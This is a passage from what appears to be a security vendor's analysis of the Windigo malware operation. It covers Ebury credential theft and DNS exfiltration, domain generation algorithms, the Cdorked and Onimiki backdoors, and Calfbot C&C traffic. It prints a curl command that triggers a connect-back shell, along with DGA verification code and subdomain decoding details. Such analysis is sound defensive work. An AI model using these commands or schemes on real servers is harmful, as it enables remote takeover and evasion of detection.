4.5.7. Types of Stolen Credentials\n\nLinux/Ebury can steal multiple types of credentials. We will describe the scenarios in which each type\nof credentials is stolen and what action is triggered. The exfiltration mechanism itself is described\nin the next section.\n\nIn all scenarios, the captured credentials are saved in memory to allow later retrieval by the backdoor\noperators via the command Xcat.\n\nUsername/password combinations used to login on the infected server\nThese credentials are intercepted by the sshd daemon, whether the authentication method used\nis kerberos, pam or using the shadow file. The credentials are saved to memory and immediately\nexfiltrated.\n\nUsername/password combinations used in connection attempts made from the infected\nserver to external systems\nThese credentials are intercepted by the ssh binary installed on the infected server, saved to memory\nand immediately exfiltrated.\n\nSSH key passphrases\nPassphrases typed by a user are intercepted by the ssh client installed on an infected server, saved\nto memory and immediately exfiltrated.\n\nSSH keys used to authenticate to a remote system from an infected server\nThese keys are intercepted by the ssh binary installed on the infected server. Unlike the previous\ntypes of credentials, the decrypted keys are not immediately exfiltrated. They are only stored\nin memory for later retrieval, since the size of the data to exfiltrate is too large for the exfiltration\nmechanism described in the next section.\n\n\n-----\n\nSSH keys added to the SSH agent with ssh-add on an infected server\nThe keys added to an OpenSSH agent are also intercepted, this time by the ssh-add program.\nBoth the decrypted keys and their associated passphrases as typed by the user are stored in memory\nbut are not immediately exfiltrated, for the same reasons as the previous scenario.\n\nHere are some of the various format strings used to store various stolen credentials in memory:\n\n\n**%s%.30s@%.128s’s password: \\t%s\\t%s\\t%d - creds source, username,**\n**host, password, remote ip, remote port**\n**ssh-add:1\\t%s\\t%s - username, password**\n**%ssshd:1\\t%s\\t%s\\t%s - creds source, username, password, remote ip**\n**key:1\\t%d\\t%s\\t%s\\t%s\\t%d\\t%s - effective uid, LOGNAME env. var.,**\n**username, server ip, server port, private key**\n\n\n###### 4.5.8. Exfiltration Mechanisms\n\nLinux/Ebury operators are using two techniques to retrieve stolen credentials, depending on the type\nof credentials: regular pulling and immediate exfiltration.\n\nThe first technique is to poll the server at regular interval using the Xcat command to pull\nthe shared memory content so that the credentials make their way to the operators’ hands.\n\nThe other technique, the immediate exfiltration, is done through specially crafted DNS requests\nsent on UDP/53 to one of the Windigo exfiltration servers. The stolen data is first encrypted with\nthe 4-byte static key, hexadecimal-encoded and transmitted as the domain name queried\nby the A record request.\n\nFigure 4.4 Linux/Ebury exfiltration packet\n\nThe meaning of the <IP address> field depends on the type of credentials being exfiltrated. In the case\nof credentials for the infected server itself, the <IP address> field corresponds to the connecting\nclient’s IP address. Otherwise, it corresponds to the IP address of the remote server to which\nthe connection was made.\n\nThe exfiltration server runs a basic UDP daemon that decrypts the incoming DNS requests and dumps\nthe data in a file, without sending any response to the DNS request.\n\nWe believe using valid DNS requests as a means to exfiltrate the stolen data was chosen to avoid being\nblocked at the firewall level, since such traffic is often unconditionally allowed in firewall configurations.\n\nA new feature to increase stealthiness was added in version 1.3.2. No data exfiltration is performed\nif Linux/Ebury detects that any network interface is running in promiscuous mode. This mode is used\nby packet capture software such as tcpdump when doing a raw capture on a network interface.\n[The version 1.3.2 was seen after the publication of an article from cPanel suggesting to run tcpdump](http://docs.cpanel.net/twiki/bin/view/AllDocumentation/CompSystem%23Command%25205)\nto monitor DNS requests and notice exfiltration data as an indicator of compromise by Linux/Ebury.\nTo detect an interface in promiscuous mode, Linux/Ebury reads the flags file inside all the interfaces\n[listed in /sys/class/net. It will then mask the output with IFF_PROMISC to check if any of them](http://man7.org/linux/man-pages/man7/netdevice.7.html)\ncould be under the control of a packet capture software.\n\n\n-----\n\n###### 4.5.9. Choosing an Exfiltration Server\n\nThe backdoor uses the exfiltration server explicitly set by the operator via the Xver command.\n[If the exfiltration server is not reachable or simply not set, a Domain Generation Algorithm (DGA)](http://en.wikipedia.org/wiki/Domain_generation_algorithm)\nis used as a backup mechanism. We observed two different DGAs being at the same time.\n\nThe new second DGA appeared in version 1.3.1 in the libkeyutils.so variant and in version 0.8.0\nfor the modified OpenSSH binaries variant. Interestingly, this new algorithm was released after\n[a sinkhole attempt was made by Dr.Web who registered some available domain names. The new](http://news.drweb.com/%3Fi%3D3332%26lng%3Den)\nversion also includes a stronger verification mechanism to prevent future sinkhole attempts.\n\n###### First Generation\n\nThe first generation DGA creates variable length domain names composed of alphanumeric\ncharacters using one of the following TLDs:\n\n - .biz\n\n - .net\n\n - .info\n\nThe DGA is seeded by an integer. In samples we analyzed, the seed starts at 3 and is incremented\nby 1 at every domain verification failure.\n\nThis verification is done by resolving both the domains seeded by n and by n + 5009 and then comparing\ntheir A records. The verification is successful if both domains resolve to the same address.\n\nAnalysis of the DGA is further complicated by the fact that the valid domain’s IP address is not used\nas-is by Linux/Ebury. A chained XOR is applied to each byte, then the bytes are inverted. For example,\n[if the operator wanted to point a DGA domain to ESET’s blog’s server, the A record should be set](http://www.welivesecurity.com)\nto 218.237.42.189, so that the algorithm would yield:\n\n\n**218 ^ 244 => 46**\n**237 ^ 46 => 195**\n**42 ^ 195 => 233**\n**189 ^ 233 => 84**\n**Resulting in 84.233.195.46.**\n\n\nTo summarize, here is a Python implementation of the domain verification process:\n\n\n**i_max = 10**\n**while i_max < 1024:**\n**for i in range(3, i_max):**\n**if resolve(dga(i)) == resolve(dga(i+5009)):**\n**return chain_xor_ip(resolve(dga(i)))**\n**i_max += 10**\n\n\nA list of the domains generated by the DGA is available in the IOC section of this document\nfor reference.\n\nSecond Generation\n\nThe main feature of the second generation DGA is an improved domain verification process using\nstrong cryptography in order to authenticate the real domain owner.\n\nTo verify such ownership, the domain’s TXT record is retrieved. Operator-controlled domains contain\na signature made by the RSA encryption of the domain and its A record concatenated. The 1024 bit\npublic RSA key is embedded inside Linux/Ebury in order to perform the decryption:\n\n\n**-----BEGIN RSA PUBLIC KEY-----**\n**MIGJAoGBAO9KdhaD9i6C8DdK4a1KFLwc7FvqdKPpw+qTZU2rMBFr1ZuSQavMdm++**\n**K6yhjdEmI0k9e3g8GLGn62tFPMBKALCiakkAGcIFoHk+eyMGY6KEiZP4/st/PBFK**\n**J7mBB0HOJHjMxZIrlgIGWEc8LzDWQK5m2/8gWvOBfNSmDprWKI49AgMBAAE=**\n**-----END RSA PUBLIC KEY-----**\n\n\n-----\n\nLet’s illustrate the verification process with an example based on the domain o8rad5ccx9f3r.net.\nAt some point in time, this domain had a single A record with the value 115.113.224.211\nand a single TXT record containing:\n\n\n**“RmsONkT9yOyGjwln/LkkpKWAd8V5ALYnBoPJSTzybb411VEXOCzla5WWdP98ziEBIQxWl**\n**LOlnUqgyN0xJ579SWyLgb7DCUc1dhG0cVzKE6vBcM51LII80epyNKM4vljdvuOFXEaicXFbrmej**\n\n\nDecrypting this string by performing:\n\n\n**RSA_public_decrypt(pubkey, base64_decode(txt))**\n\n\nreveals:\n\n\n**o8rad5ccx9f3r.net115.113.224.211**\n\n\nSince the decrypted string matches the concatenation of the domain with its A record, the domain\nis considered verified by Linux/Ebury and used to derive the exfiltration server IP address. The chained\nXOR is applied to the IP address and will be taken as the exfiltration server.\n\nJust like the first generation algorithm, a chained XOR must be applied to the resulting IP address.\n\nThe first ten domains generated by this version of the DGA is also listed in the IOC section\nof this report.\n\n\n-----\n\n### 5. LINUX/CDORKED\n\nLinux/Cdorked is a backdoor used to redirect legitimate web traffic intended for the infected server\n[to a malicious location. It was first discovered by Sucuri in April 2013 and consisted in a trojanized](http://blog.sucuri.net/2013/04/apache-binary-backdoors-on-cpanel-based-servers.html)\n[version of an x86 Apache httpd binary. After the publication of the technical analysis, multiple system](http://httpd.apache.org)\nadministrators came forward and provided ESET with new binaries. With their help, we discovered\n[the existence of trojanized x64 Apache httpd as well as x86 lighttpd and nginx.](http://www.lighttpd.net)\n\n##### 5.1. Features\n\n###### 5.1.1. Traffic Redirection\n\nLinux/Cdorked is used by the Windigo operators to redirect web traffic to drive-by-download\nmalware distribution points and advertisement networks.\n\nThe Windigo operators have maintained a low profile by redirecting only a very small subset\nof the web traffic. The redirection conditions are described in the redirecting visitors section.\n\n###### 5.1.2. Backdoor\n\nLinux/Cdorked also includes a connect-back shell backdoor, allowing the malicious operators to run\narbitrary commands on the compromised server. It is used by the Windigo operators as a second\nbackdoor to the infected server, on top of the previously installed Linux/Ebury component.\n\n###### 5.1.3. Stealth\n\nThe developers of Linux/Cdorked were careful to make the behavior of their trojanized daemon\nas stealthy as possible. They have ensured that:\n\n - No configuration files are kept on disk\n\n - No interactions from the attacker are logged by the backdoored daemon\n\n - Administrators of the server will not be served malicious content\n\n - Strings from the added features are encoded in the trojanized binary\n\n - The developers receive statistics on the number of users that were redirected over\na period of time\n\n - The developers remain unseen by system administrators thanks to multiple stealth features\n\nThe added code in the http daemon is also designed to be hard to spot. All the strings are encoded\nand only decrypted before they are used. They are usually discarded after their use, meaning\nthat there is never a point in time when all the strings for the code are decrypted in memory.\n\n##### 5.2. Persistence\n\nJust as with Linux/Ebury, the Linux/Cdorked binary is copied over the original binary on an infected\nsystem. Variants of Linux/Cdorked exist for the most common web servers:\n\n - Apache httpd\n\n - Nginx\n\n - Lighttpd\n\nThe backdoor code is heavily reused between the three variants, but the hooks are obviously different\nfunctions since the structures of the three types of software are different.\n\n##### 5.3. Malware Operation\n\n###### 5.3.1. Using the Backdoor\n\nThe connect back shell is created by sending a web request containing a specific GET_BACK\nparameter in the HTTP GET request specifying the IP address and port to connect back to.\n\n\n-----\n\nThe IP address and port must first be encrypted by using the connecting client’s IP address\nas a 4-byte XOR key and, then hexadecimal-encoded.\n\nHowever, a special mechanism allows the malware to override the use of the client’s IP address\nto perform the decryption by adding an X-Real-IP or an X-Forwarded-For HTTP header to the query.\nThis allows the crafting of a header that will effectively be a \\x00\\x00\\x00\\x00 xor key, voiding\nthe xor operation. This simplifies the generation of HTTP requests launching the connect- back shell:\n\n\n**curl -H “X-Real-IP: XXX.XXX.XXX.XXX” -i -s**\n**http://192.168.56.101:8080/?favicon.iso?$(python -c ‘print**\n**“GET_BACK;192.168.56.1;4444”.encode(“hex”)’)**\n\n\nNote that the backdoor shell hangs the process that created it, a characteristic that could be used\nby a system administrator to identify a compromised server.\n\n###### 5.3.2. Configuring a Linux/Cdorked Instance\n\nLinux/Cdorked does not have the ability to request configuration information from a C&C.\nInstead, the configuration is pushed directly by the backdoor operators by using specially crafted\nHTTP POST requests. This implies that no command and control information is stored anywhere\ninside the Linux/Cdorked binaries.\n\nThe configurable parameters available to the backdoor operator allow fine-grained control\nover the redirection rules such as regional, platform and IP address characteristics.\n\n###### 5.3.3. Commands\n\nThe table below shows the commands that are processed by the backdoor and their significance.\n\n\nTable 5.1 Supported commands\n\n\nCommand Functionality\n\nL1- D1 Load or delete the list of redirect URL\n\nL2- D2 Load or delete the list of blacklisted IP ranges\n\nL3- D3 Load or delete the list of User-Agent whitelist patterns\n\nL4- D4 Load or delete the list of User-Agent blacklist patterns\n\nL6- D6 Load or delete the list of blacklisted IP addresses\n\nL7- D7 Load or delete the list of request excluded pages\n\nL8- D8 Load or delete the list of whitelisted IP ranges\n\nL9- D9 Load or delete the list of Accept-Language blacklisted patterns\n\nLA- DA Load or delete the list of request whitelisted pages\n\nST Print server statistics\n\nDU Clear the list of redirected IP addresses\n\nT1 Request timestamp\n\n##### 5.4. Internals\n\n###### 5.4.1. Deployment\n\nThe Windigo operators use the previously installed Linux/Ebury backdoor in order to deploy\na Linux/Cdorked instance. First, the complete source code of the targeted web server is downloaded,\nalong with a malicious “diff patch” coming from a server under the attacker’s control. The patch\nis then applied to the clean source code and a new binary is compiled.\n\nFinally, the original web server binary is moved to a backup location and the new malicious binary\nis moved in place.\n\n\n-----\n\n###### 5.4.2. Configuration\n\nThe operator configures the backdoor by sending HTTP POST requests to a specially crafted URL.\nThe request must contain a cookie header starting with SECID= to send optional command arguments.\n\nThe query string value holds the two-byte command encrypted with the client IP address in the same\nway as the connect back shell is triggered.\n\nLinux/Cdorked, much like Linux/Ebury, does not keep any files on the disk. Instead, it allocates\n[a 6MB POSIX shared memory segment to store its state and configuration information.](http://man7.org/linux/man-pages/man7/shm_overview.7.html)\n\nThe following shows the decrypted content of the shared memory region found on an infected server:\n\n\n**Timestamp: 03/23/12 02:08:10**\n**Total redirection: 10003**\n**Redirect url (L1) list (1 entry)**\n**----------------------------------------------**\n**<*;5,15,100;http://obfuscated.obfuscated.com.br/index.**\n**php?dvoyeyp=zndw&time=00000000000000000000&**\n**User-agent (redirected if in list) (L3) list (7 entries)**\n**----------------------------------------------**\n**<*MSIE 7*Windows NT 5.1*>**\n**<*MSIE 8*Windows NT 5.1*>**\n**<*Windows NT 5.1*Firefox*>**\n**<*iPhone*>**\n**<*iPad*>**\n**<*Macintosh*>**\n**<*Windows NT*Chrome*>**\n**User-agent (not redirected if in list) (L4) list (10 entries)**\n**----------------------------------------------**\n**<*bot*>**\n**<*linux*>**\n**<*Ubuntu*>**\n**<*Nokia*>**\n**<*N_O_K_I_A*>**\n**<*Symbian OS*>**\n**<*X11*>**\n**<*opera*>**\n**<*googl*>**\n**<*gentoo*>**\n**Referer (not redirected if in list) (L5) list (0 entry)**\n**----------------------------------------------**\n**(empty)**\n**Blacklist ip list (L6) list (2468 entries)**\n**----------------------------------------------**\n**(not printed)**\n**URI list (redirected if in list) (L7) list (2 entries)**\n**----------------------------------------------**\n**<*support*>**\n**<*robots.txt*>**\n**Subnet list (not redirected if in list) (L8) list (24062 entries)**\n**----------------------------------------------**\n**(not printed)**\n**Language check (not redirected if in list) (L9) list (8 entries)**\n**----------------------------------------------**\n**<*jp*>**\n**<*fi*>**\n**<*ja*>**\n**<*zn*>**\n**<*ru*>**\n**<*uk*>**\n**<*be*>**\n**<*kk*>**\n**URI list (redirected if in list) (LA) list (0 entries)**\n**----------------------------------------------**\n**(empty)**\n**Last redirection (not redirected if in list and time < 48h) list (5371 entries)**\n**----------------------------------------------**\n**(** **)**\n\n\n-----\n\n###### 5.4.3. Redirection Statistics\n\nAt regular time intervals, we observed the attacker connecting to the infected server to retrieve\nthe redirection module statistics using the ST command:\n\nFigure 5.1 Retrieving statistic from a Linux/Cdorked instance\n\nThe response is stored in an Etag response header field in the following format:\n\nkey (unique per infection) total redirection count list L1 to LA item count\n```\n   ETag: b66558-31d-ee9e; 00-4a136c4f-392b-1-0-5-f-4-a82-2-43c8-4-0-847\n\n```\n\nrandom\n\n\ntimestamp (used for redirection probabilities) redirection count (since last reset)\n\n\nFigure 5.2 Linux/Cdorked redirection statistics response\n\n###### 5.4.4. Redirecting Visitors\n\nLinux/Cdorked carefully decides whether or not to redirect a visitor. First, the server checks whether\na special cookie is present in the visitor’s browser. The existence of the cookie means that the user\nhas already been redirected, which will prevent the visitor from being redirected again. Then,\nthe server determines whether the original URL includes strings such as “support”, “webmaster”\nand “webmin”, which could indicate the presence of a system administrator. If one of the strings\nis found, a special non-redirection cookie is set in the visitor’s browser, making sure no redirection\nis ever triggered for this particular visitor.\n\nFurthermore, other general properties must absolutely be verified for the user to be considered\nas a redirection candidate:\n\n - Presence of the Accept-Language HTTP header\n\n - Presence of the Accept-Encoding HTTP header\n\n - Presence of the User-Agent HTTP header\n\n - Requested URL ends with .htm, .html, .php or .js\n\n - Client IP address has not been redirected within the last 48 hours\n\nThe backdoor operator can also configure the redirection module to control the redirection conditions\nvery precisely by using the L2-L9 commands.\n\nThe entire redirection mechanism occurs before any action is sent to the trojanized HTTP daemon\nlogging facility, making it harder for system administrators to discover the infection.\n\n\n-----\n\n##### 5.5. Linux/Onimiki\n\nThe DNS component is a patched BIND DNS server used to resolve domains with a particular\npattern to any IP address. When a victim visits a Linux/Cdorked infected website, the domain name\nin the URL where the redirection is done follows that pattern and is resolved by a Linux/Onimiki\ninfected server.\n\nWhy isn’t the gang using the IP address directly? Using the modified BIND named binary\non legitimate servers offers a lot of advantages:\n\n - Because the nameserver is authoritative for legitimate domains, the malicious operators\ncan use its reputation to avoid blacklisting\n\n - It is stateless and no configuration is required after Linux/Onimiki is installed. This limits\nthe interaction between the operators and the infected server\n\n - It allows a fast rotation of subdomains\n\n - It also allows a fast rotation of the legitimate domains because the affected servers\nare authoritative for many different websites\n\n - Automatic domain expiration makes replaying the behavior quite difficult\n\nAlthough its usage seems limited to integration with Linux/Cdorked, it is a standalone component\nthat could be used by other services. Anyone with the knowledge of the generation algorithm\ncan generate valid domain name that points to an IP address of his or her choice.\n\nNote that Linux/Cdorked is also not limited to redirecting users to URLs with domain name hosted\non a Linux/Onimiki infected server. Any URL can be configured in Linux/Cdorked to redirect victims\nvisiting affected websites.\n\nNormal server operation is not disrupted by the malware. A server infected with Linux/Onimiki\nwill still continue to perform its legitimate duties of resolving domains in its BIND database.\nLeaving only a modified named binary, it makes it not obvious to system administrator\nthat they are compromised.\n\nUsing this technique, the operators probably want to avoid blacklisting. A fast rotation of the subdomains\n(about every hour) does not allow enough time for blacklisting based on the subdomain only. Since\nthe domain serves a legitimate websites and possibly legitimate subdomains, it is impossible to block\nthe whole domain. This only leaves the IP address to which the domains resolve. Although the target\nIP address change less frequently than the subdomains, it’s still not enough for most automated\nreputation systems to flag the IP addresses as bad before they change.\n\nAll the Linux/Onimiki infected hosts we have witnessed were also infected with Linux/Ebury.\n\n###### 5.5.1. Subdomain Pattern\n\nThe general form of a domain resolved by Linux/Onimiki is\n\n\n**<encoded_data><extra_data>.mywebsite.com**\n\n\nThe encoded_data in the subdomain is used to generate the response A record that will be sent\nby the server to the victim resolving the domain. The extra_data part of the domain is optional\nand is ignored by Linux/Onimiki. In the case of a Linux/Cdorked redirection, it is used to store\ninformation specific to the victim such as a timestamp after the first redirection.\n\nThe format of encoded_data changed in 2013. The first generation format of encoded_data\n[was first seen at the end of 2012 and was used until May 2013. When we published some details](http://www.welivesecurity.com/2013/05/07/linuxcdorked-malware-lighttpd-and-nginx-web-servers-also-affected/)\nof the workings of the first generation algorithm, the format changed to something a lot more\ndifficult to reverse engineer in a black box situation. This second generation format has been\nused from May 2013 up until now. Both algorithms are documented later in this document.\n\n\n-----\n\n###### 5.5.2. First Generation\n\nWhen we first investigated Linux/Cdorked in spring 2013, we found the URLs to which Linux/Cdorked\ninfected websites were redirecting to were always following a pattern of using subdomains\nconsisting of 16 nibbles[3] over a legitimate website.\n\nThe domains looked like this:\n\n\n**510004268b47d05b.mywebsite.com**\n\n\nThe first URL redirected to another subdomain, this time unique to the victim. The first\n16 nibbles remained the same and the rest contains a timestamp and other data as shown\nin the example below.\n```\n510004268b47d05b01414113050222483098587bcf02fc1731aade45f74550b.mywebsite.com\n\n```\ntimestamp: 13/05/02 22:48\n\nEncoded IP Address src id (possibly a unique identifier of Linux/Cdorked infected web server)\n\niflag (am I in an iframe?)\n\nFigure 5.3 Long Linux/Onimiki subdomain example\n\nThe legitimate websites affected were all hosted on a limited number of name servers. We strongly\nbelieved these servers were compromised, but we didn’t know at the time how they were able to add\nand remove subdomains so fast and allow long and unique subdomains to work all the time without\nbeing noisy.\n\nWe started playing with the different nibbles in the subdomain and found out we were able to control\nthe DNS server response when changing the right bits. The nibbles responsible for the IP address\nresponse are the ones in the even position as shown in the following figure.\n```\n        510004268b47d05b.mywebsite.com\n          1046b70b : chained XOR encoded response IP\n          500284d5 : key? expiration date?\n\n```\nFigure 5.4 Decoding the first generation Linux/Onimiki algorithm\n\nEach byte of the resulting 4 byte string is then XORed with its previous sibling to form the final\nIP address that will be returned in the A record.\n\n|Col1|Col2|Col3|\n|---|---|---|\n||||\n\n\n**byte[] = { 0x10, 0x46, 0xb7, 0x0b } // From the hex string**\n**seed = 0x31 // This seed changes, it is probably in the odd nibbles**\n**ip[0] = seed ^ byte[0] // 33**\n**ip[1] = byte[0] ^ byte[1] // 86**\n**ip[2] = byte[1] ^ byte[2] // 241**\n**ip[3] = byte[2] ^ byte[3] // 188**\n**// The server will give us a response with an A record 188.241.86.33**\n\n\nThe seed used changes from one subdomain to another. We believe it is contained in the nibble\nin the odd position, but were unable to find how it is generated.\n\nWe were not able to confirm this, but we also believe the even nibbles contained a timestamp\nbecause the subdomains stopped resolving after a short period of time (between 6 and 12 hours).\n\nDue to the single and unique use of the long subdomain and the algorithmic nature of the subdomain\ngeneration, we suspected the DNS server binary had to be compromised to achieve this behavior.\n\n3 4 bits of data represented by an hexadecimal digit\n\n\n-----\n\n###### 5.5.3. Second Generation\n\nThe new algorithm is the one that is still used today. It is no longer a hexadecimal-looking format.\nThis short version of the domain looks like this:\n\n\n\n**[a-z0-9]{23}.mywebsite.com**\n\n\nAn example domain could be:\n\n\n**b9kpa7mvpfpdencbf3uarrx.mywebsite.com**\n\n\nAfter notifying victims of Linux/Cdorked, system administrators agreed to send their BIND’s named\nbinaries to ESET’s security intelligence team for analysis. We were able to reverse engineer\nthe algorithm used to decode data in the subdomain allowing the Linux/Onimiki component to work.\n\nThe algorithm changed in such a way that it is impossible to change the response by modifying\na single character. A checksum is embedded in the subdomain in an attempt to prevent researchers\nfrom finding out how it works. We will present in a nutshell how the algorithm works.\n\nThe two last characters are used as a seed to feed a custom pseudo-random number generator.\nThis PRNG is used to output an ordered set of numbers from 0 to 21. It is then split in 3 arrays\nof 7 indexes of characters to concatenate.\n```\n               b9kpa7mvpfpdencbf3uarrx.mywebsite.com\n                                prng_generate_set(’rx’) → [3, 9, 1, ..., 16, 13, 4]\n\n```\n[ 3, 9, 1, 17, 15, 10, 18] : pf93bpu (IP address)\n\n[ 8, 5, 12, 2, 6, 7, 11] : p7efmvd (timestamp)\n\n[19, 14, 20, 0, 16, 13, 4] : acrbfna (checksum)\n\nFigure 5.5 Decoding the second generation Linux/Onimiki algorithm\n\nEach part is then decoded to a 32 bit integer using base 36 with its alphabet in a random order based,\nagain, on the last 2 characters of the subdomain.\n\n\n**custom_base36_decode(‘rx’, ‘pf93bpu’) # 0x54e9c32e # 84.233.195.46**\n**custom_base36_decode(‘rx’, ‘p7ekmvd’) # 0x52cde51c # Wed Jan 8 18:54:04 2014**\n**custom_base36_decode(‘rx’, ‘acrbfna’) # 0xe147e83d**\n\n\nThe checksum is verified by computing the MD5 hash of the concatenation of each value and choosing\nspecific bytes in the result.\n\nThe timestamp is present to allow the domain to work only for a 24 hour period. More specifically,\na subdomain will only work 18 hours before, and 6 hours after the timestamp.\n\nThe long version of the subdomain has also changed from the first generation. It is now:\n\n\n**b9kpa7mvpfpdencbf3uarrx50695382f63553e9f46a4904e6253e6a2.mywebsite.com**\n\n\nIt now contains what seems to be a hexadecimal string of length 33. Since it is not parsed\nby the Linux/Onimiki binary, we were unable to understand what its content is, if there’s any\nmeaning to it besides being random.\n\n\n-----\n\n### 6. PERL/CALFBOT\n\nPerl/Calfbot is a lightweight spam bot written in Perl that gets its instructions from a C&C server\n[resolved using a Domain Generation Algorithm (DGA). As you will see, it is simple, stealthy and effective.](http://en.wikipedia.org/wiki/Domain_generation_algorithm)\n\nPerl has been around on server systems for ages. Contrary to most other commonly installed\n[interpreted languages, it has a strong belief in backwards compatibility so it constitutes a sensible](http://perldoc.perl.org/perlpolicy.html#BACKWARD-COMPATIBILITY-AND-DEPRECATION)\nchoice in order to develop portable server-side malware.\n\nHere are a few highlights:\n\n - Code is obfuscated\n\n - Hides its running process\n\n - Does not persist and is present only in memory\n\n - Encrypted communications\n\n - Interesting validation of command and control servers\n\n - Re-uses basic system commands\n\n - Supports unprivileged operation\n\n - Works on many Unix variants (Linux, OpenBSD, etc.)\n\n##### 6.1. Features\n\n###### 6.1.1. Simple and Portable\n\nWeighing in at a mere 673 lines of code and relying on no external modules, this spambot is as simple\nas obfuscated Perl code can be.\n\nIn addition to Perl’s broad OS support, Perl/Calfbot is portable because it relies a lot on the built-in\nfeatures offered by “modern” Unix operating systems like which to lookup the appropriate download\ntool on the infected system (wget, curl or fetch) and the flock system call.\n\n[Additionally, it leverages the mail submission agent (MSA) and the mail transfer agent (MTA)](http://en.wikipedia.org/wiki/Message_transfer_agent)\npresent on the system. Aside from portability, this also has the benefit of having less code\nto maintain and being generally more compatible than if the operators would have implemented\n[their SMTP client themselves (greylisting comes to mind as a classic counter-measure for badly](http://www.greylisting.org/)\nwritten spam engines). We will discuss this integration in more detail later in the report.\n\n###### 6.1.2. Stealth\n\nPerl/Calfbot is stealthy. It uses a wide variety of tricks in order to avoid detection. Here’s a summary\nof the strategies used:\n\n - Hides its process name, changing it to /usr/bin/crond to fool the sysadmin\n\n - Exists only in memory making it harder to recover the original Perl script\n\n - Uses standard HTTPS port for C&C communications\n\n - Does not persist across system reboot\n\n - Prefers to kill itself if ineffective at sending spam rather than to keep trying\n\n - Kills itself if it’s unable to reach the C&C within 24 hours\n\n\nSide Story\nPerl/Calfbot was discovered due to a mistake made by the operators on an Linux/Ebury infected server.\nThey used the wget command to retrieve the Perl script, then deleted it without executing it. We were\nable to replay the command to obtain the script.\n\n\n###### 6.1.3. Spam Daemon\n\nThe main feature of Perl/Calfbot is to send spam to a list of recipients to generate traffic\non affiliate accounts. You can read a more detailed analysis of spam jobs in the operation section\nunder Spam Analysis.\n\n\n-----\n\n##### 6.2. Changelog\n\nJust like Linux/Ebury, Perl/Calfbot maintains versioning information in its code. We first stumbled\nupon version 38 and thoroughly reverse engineered it. Afterwards, we received version 39, 40 and 41\n[in updates through our fake client. We later discovered version 27 and 36 on pastebin. Below](http://pastebin.com/gJJ35RQW)\nis a summary of the changes introduced by each version:\n\n\nTable 6.1 Perl/Calfbot’s variant changelog\n\n\nVersion Timeline Changes\n\n27 Uploaded to pastebin\non November 27th 2012\n\n36 Uploaded to pastebin\non March 15th 2012\n\n38 Caught on July 19th 2013 First version we analyzed\n\n39 Update received Added quoted-printable base64 encoding with subject\non August 27th 2013 templating\n\n40 Update received Removed dependency on CGI by reimplementing\non December 5th 2013 **CGI::escape inline. Also sends a new constant i =’perl’**\nto the server.\n\n41 Update received Added quoted-printable base64 encoding and template\non December 12th 2013 support for the From: email header\n\n##### 6.3. Persistence\n\nPerl/Calfbot does not persist on the system in any way. If a system administrator was to reboot\nthe server then no trace of the Perl/Calfbot infection would be left behind. This might seem odd\nfor people used to malware targeting desktop computers but for a server which doesn’t reboot\noften, this makes sense: anyone taking the server offline for investigation would kill the evidence\nof infection. The same goes for copying the whole disk in order to perform traditional filesystem\nforensics. Additionally, in the case of Windigo, the operators already have access to the server\nthrough stolen credentials so they can reinfect the server at will if it ever gets rebooted.\n\nPerl/Calfbot prefers to stop executing rather than to keep running in a state where it cannot achieve\nits main spam sending purpose. For example, it will kill itself if it isn’t able to reach the C&C server\nwithin 24 hours. Additionally with the fake client we also found that the C&C server will send a KILL\ncommand to the bot after a few days if it wasn’t able to send a single TESTSEND job successfully.\n\n##### 6.4. Malware Operation\n\n###### 6.4.1. Interaction with Other Systems\n\nThe following image describes Perl/Calfbot’s interactions with its command and control server:\n\n\nresolves\n\n\nServer running\nPerl/Calfot\n\nSend spam jobs\n\n\nresolves to\n\n\nCalfot real\nC&C server\n\n\nLegitimate system/user\n\nInvolved in malicious\nactivity\n\nInfected with\nLinux/Ebury\n\nInfected with\nPerl/Calfot\n\n|Cal|Col2|\n|---|---|\n||Cal are host|\n\n|resolve|s to|\n|---|---|\n\n\nServers running\nHTTPS reverse\nproxy on port 443\n\n\nreports\n\n\n-----\n\nYou can see the trail of domain redirections in order to retrieve the IP address of the C&C\nand that this C&C is in fact a reverse proxy front-end to the real C&C hidden behind it. It’s important\nto note that everything related to Perl/Calfbot, namely the front-end servers and the DNS servers,\nare all running on an infrastructure compromised one way or another by the Windigo operation.\n\n###### 6.4.2. Querying the C&C\n\nThe normal operation of the bot is to query the server using an HTTP GET request over HTTPS\ncarrying a payload of encrypted and unencrypted data. It sends the following information:\n\n\nTable 6.2 Information sent by Perl/Calfbot’s infected server to its C&C\n\n\nField Description Encrypted\n\nid nonce*bot-instance- id*session-key yes\n\nsent Number of emails sent in last job no\n\nnotsent Number of emails not sent in last job no\n\nunknown (Optional) Last command given if it didn’t match any supported no\ncommand.\n\ntestsend (Optional) Set to 1 if the last command was a testsend no\n\nstat nonce*client-information yes\n\nThe encrypted fields are encrypted using the same XOR-based technique as Linux/Cdorked\nand Linux/Ebury but with different hardcoded constants, using the server’s IP as the key\n(note that Linux/Cdorked and Linux/Ebury uses the client’s IP).\n\nThe client-information piece is a Perl hash (a key-value data structure) encoded\nin a key1=value1|key2=value2|... format. Here is a description of what is sent to the server:\n\n\nTable 6.3 Client-information description\n\n\nKey Description\n\nbr HTTPS tool used (wget, curl and fetch are supported)\n\nv Bot version\n\nw Username under which Perl/Calfbot is running\n\nrb Was the code updated or not (0 or 1 value)\n\npi Perl/Calfbot’s process id\n\niv Perl’s version\n\nma Mail server installed\n\nmc Mail program used to send emails\n\nfd C&C domain name\n\nfi C&C IP address\n\nfp C&C port\n\nAs mentioned earlier, the communication is performed with either wget, curl or fetch depending\non what is installed on the operating system. All are specifically configured to ignore any certificate\nerrors and time-out after 60 seconds.\n\nHere’s an example URL used by Perl/Calfbot to communicate with its C&C:\n```\n        https://184.107.139.250//b/index.php?id=f65723512faaf2634ddbb1339\n        db4764ccb60982236b9515441f85380c5b92e&sent=0&notsent=0&stat=f6582\n        65128a18ec5edb4465d4af06897e2d342866a361086afe73f565a4cb798aebe32\n        705a43f56ecb871d58663e2a2540f26df725f46a012ed9335243080b5cf91a43d\n        8d2c135c85c69590f4b9287b111c7b613536858ae91fe4c1d686df7671a6994c2\n        581b3794b65e04872b21ff80a5d607823641d3cf76997f0b1ff743f37f7f8f6cf\n        f7c0e2fc46c9bc9e49b2d9a763e425b131cff4aa17a79\n\n```\nFigure 6 2 Perl/Calfbot C&C communication\n\n\n-----\n\nThe server replies with a list of encrypted strings separated by newline (“\\n”) characters. They are\nencrypted by the server using the session key sent earlier by the client in the “id” field. The encryption\nalgorithm used is the same as the one used in the client request. The first line holds the command\nfrom the server. Subsequent lines, if present, are command specific parameters.\n\n###### 6.4.3. Commands\n\nHere are the commands implemented 